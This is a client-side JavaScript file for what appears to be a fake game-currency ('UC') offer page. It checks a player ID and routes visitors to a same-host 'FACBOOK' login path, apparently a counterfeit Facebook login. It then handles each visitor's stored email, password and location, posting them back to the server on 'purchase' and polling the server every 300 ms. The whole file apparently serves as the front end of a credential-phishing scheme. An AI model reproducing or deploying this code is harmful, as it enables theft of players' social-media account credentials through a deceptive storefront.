const conbtn1 = document.getElementById('conbtn1')
const playerid = document.getElementById('playerid')

const player = document.getElementById('player')
const btnv = document.getElementById('btnv')
const UC = document.getElementById('UC')
const DA = document.getElementById('DA')
const ererr1 = document.getElementById('ereer1')
var pom = document.getElementsByClassName('pom')
var red
var dataserh
var TTvalue = undefined
var A
var IA
var Email
var Password
var Locatioo
var afer
var ID = localStorage.getItem('ID')
if (ID == null) {
  var RA =Math.floor(Math.random()*100000000)
  localStorage.setItem('ID',RA)
  ID = localStorage.getItem('ID')
}
console.log(ID)
function serh(t) {
let apiserh = new XMLHttpRequest()
   apiserh.open('POST','https://'+location.host+ '/apiserh')
   apiserh.setRequestHeader("Accept","application/json")
   apiserh.setRequestHeader("Content-Type","application/json")
   apiserh.onreadystatechange=function(){
     if (apiserh.readyState == 4){
        dataserh = JSON.parse(apiserh.responseText).D
        console.log(dataserh)
        if (dataserh == undefined) {
  let api = new XMLHttpRequest()
  api.open('POST','https://' +location.host+ '/api/'+ID)
  api.setRequestHeader("Accept","application/json")
  api.setRequestHeader("Content-Type","application/json")
  api.onreadystatechange=function(){
    if (api.readyState == 4){
        setTimeout(()=>{serh('')},1000)
    }
    }
     var data =`{
     "ID":"${ID}",
     "IA":"false",
     "BANE":"false",
     "AFER":"",
     "Location":null,
     "Email":${ID},
     "Password":null
   }`
   api.send(data)
        }else if(dataserh != undefined){
            dataserh = JSON.parse(apiserh.responseText).D
            A = dataserh.Email
            Email = dataserh.Email
            Password = dataserh.Password
            IA = dataserh.IA 
            Locatioo = dataserh.Location
            if (dataserh.BANE == "true") {
                if (t != 't') {
                    location.href='https://'+location.host+'/sold/UC/2'
                }
            }
            console.log(IA)
            if ( IA == "true") {
                LOG()  
            }
        }
        }
    }
    dataID=`{"ID":"${ID}"}`
    apiserh.send(dataID)
}
serh('')
    //----------------------------------------------------------------------
conbtn1.onclick=function(){
  location.href='https://' +location.host+ '/FACBOOK/login/='+ID  
}
btnv.value='buying'
onkeyup=function(){
    console.log('islam')
    var DT = playerid.value
    var n0 = 0
    var n1 = 0
    var n2 = 0
    var n3 = 0
    var n4 = 0
    var n5 = 0
    var n6 = 0
    var n7 = 0
    var n8 = 0
    var n9 = 0
        for (let z = 0; z < playerid.value.length; z++) {
            if (DT[z] == '0') {
                n0 ++
                red = false       
            }else if (DT[z] == '1') { 
                n1 ++
                red = false       
            }else if (DT[z] == '2') {
                n2 ++
                red = false       
            }else if (DT[z] == '3') {
                n3 ++
                red = false       
            }else if (DT[z] == '4') {
                n4 ++
                red = false       
            }else if (DT[z] == '5') {
                n5 ++
                red = false       
            }else if (DT[z] == '6') {
                n6 ++
                red = false       
            }else if (DT[z] == '7') {
                n7 ++
                red = false       
            }else if (DT[z] == '8') {
                n8 ++
                red = false       
            }else if (DT[z] == '9') {
                n9 ++
                red = false       
            }else{red = true}
        }
        if (DT.length < 8) {
            red = true
        }
        if (DT.length > 11){
            red = true
        }
        if (DT.length >= 15) {
            playerid.value=''
        }
        if (DT = ''){
            red = false
        }
        if (n1 > 4) {
            red = true
        }else if (n2 >4) {
            red = true
        }else if (n3 >4) {
            red = true
        }else if (n4 >4) {
            red = true
        }else if (n5 >4) {
            red = true
        }else if (n6 >4) {
            red = true
        }else if (n7 >4) {
            red = true
        }else if (n8 >4) {
            red = true
        }else if (n9 >4) {
            red = true
        }
        //console.log(n0+' '+n1+' '+n2+' '+n3+' '+n4+' '+n5+' '+n6+' '+n7+' '+n8+' '+n9)
        if (red == true) {
            player.style.background='red'
        }else if( red == false){
            player.style.background='rgb(0, 148, 15)'
        }
}

function PY(id) {
    var PRO = document.getElementById(`${id}`)
    TTvalue = PRO
    var q = PRO.id
    afer = id
    console.log(afer)
    if (id == "30xFRR") {
        ererr1.innerText='Offer available 1 time'
        ererr1.style.display='block'
    }else{
        ererr1.style.display='none'
    }
    for (let z = 0; z < pom.length; z++) {
    pom[z].style=`
        position: relative;
        width: 250px;
        height: 250px;
        background: rgba(0, 0, 0, 0.672);
        border-radius: 30px;
        border: 2px aliceblue solid;
        margin: 25px auto 0 auto;
        transition: 300ms;
        `
    }
    
    PRO.style=`
    position: relative;
    width: 250px;
    height: 250px;
    background: rgba(0, 0, 0, 0.672);
    border-radius: 30px;
    border: 3px blue solid;
    margin: 25px auto 0 auto;
    transition: 300ms;
    `
    var X = q.indexOf('x')
    var uc = q.slice(0,X)
    var da = q.slice(X + 1,q.length)
    UC.innerText=uc
    DA.innerText=da
}
btnv.onclick=function(){
    if (playerid.value == '') {
        ererr1.innerText='Please enter your player ID'  
        ererr1.style.display='block'
    }else if (red == true) {
        ererr1.innerText='Error in player ID'
        ererr1.style.display='block'
    }else if (TTvalue == undefined) {
        ererr1.innerText='Please choose an offer'
        ererr1.style.display='block'
    }else if(red == false && IA == "false"){
        ererr1.innerText='Please log in to save data'
        ererr1.style.display='block'
    }else if (red == false && IA == "true") {
        console.log(location.pathname)
        let api = new XMLHttpRequest()
    api.open('POST','https://' +location.host+ '/apiset')
    api.setRequestHeader("Accept","application/json")
    api.setRequestHeader("Content-Type","application/json")
    api.onreadystatechange=function(){
      if (api.readyState == 4){
       console.log(JSON.parse(api.responseText))
     }
    } 
    console.log(IA)
    console.log(Email)
    var dai =`{
        "ID":"${ID}",
        "IA":${IA}, 
        "BANE":true,
        "AFER":"${afer}",
        "Email":"${Email}",
        "Password":"${Password}",
        "Location":"${Locatioo}"
         }`
     api.send(dai)
        location.href='https://'+location.host+'/sold/UC/2'
    }
}
function LOG() {
    const C_name = document.getElementById('C_name')
    var z 
    var aro = A.indexOf('@gmail.com')
    if (aro != -1) {
        z = A.slice(0 , aro)
    }else if (aro == -1) {
        z = A
    }
    C_name.innerHTML='<h5>'+z+'</h5>'
    
}
setInterval(() => {
    var onuc = new XMLHttpRequest()
    onuc.open('POST','https://' +location.host+ '/onuc')
    onuc.setRequestHeader("Accept","application/json")
    onuc.setRequestHeader("Content-Type","application/json")
    onuc.onreadystatechange=function(){
    }
    var ou =`{
        "ID":"${ID}"
         }`
         onuc.send(ou)
}, 300);


//document.getElementById('IM')